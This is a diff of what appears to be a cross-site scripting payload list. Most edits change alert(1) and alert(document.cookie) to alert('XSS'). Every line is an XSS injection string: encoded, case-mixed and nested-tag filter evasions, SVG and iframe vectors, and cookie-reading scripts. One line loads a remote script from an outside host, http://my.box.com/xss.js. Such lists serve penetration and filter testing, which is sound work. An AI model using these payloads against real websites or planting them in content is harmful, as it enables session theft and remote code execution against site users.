@@ -285,21 +285,21 @@ a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
 <script>({0:#0=alert/#0#/#0#('XSS')})</script>
 <script>ReferenceError.prototype.__defineGetter__('name', function(){alert('XSS')}),x</script>
 <script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(\'XSS\')')()</script>
-<script src="#">{alert(1)}</script>;1
-<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
-<svg xmlns="#"><script>alert(1)</script></svg>
-<svg onload="javascript:alert(123)" xmlns="#"></svg>
-<iframe xmlns="#" src="javascript:alert(1)"></iframe>
-+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
-%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
-+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
-%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
-%253cscript%253ealert(document.cookie)%253c/script%253e
-“><s”%2b”cript>alert(document.cookie)</script>
-“><ScRiPt>alert(document.cookie)</script>
-“><<script>alert(document.cookie);//<</script>
-foo<script>alert(document.cookie)</script>
-<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+<script src="#">{alert('XSS')}</script>;1
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(\'XSS\')',384,null,'rsa-dual-use')</script>
+<svg xmlns="#"><script>alert('XSS')</script></svg>
+<svg onload="javascript:alert('XSS')" xmlns="#"></svg>
+<iframe xmlns="#" src="javascript:alert('XSS')"></iframe>
++ADw-script+AD4-alert('XSS')+ADw-/script+AD4-
+%2BADw-script+AD4-alert('XSS')%2BADw-/script%2BAD4-
++ACIAPgA8-script+AD4-alert('XSS')+ADw-/script+AD4APAAi-
+%2BACIAPgA8-script%2BAD4-alert%28'XSS'%29%2BADw-%2Fscript%2BAD4APAAi-
+%253cscript%253ealert('XSS')%253c/script%253e
+“><s”%2b”cript>alert('XSS')</script>
+“><ScRiPt>alert('XSS')</script>
+“><<script>alert('XSS');//<</script>
+foo<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
 %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
 ‘; alert('XSS'); var foo=’
 foo\’; alert('XSS');//’;
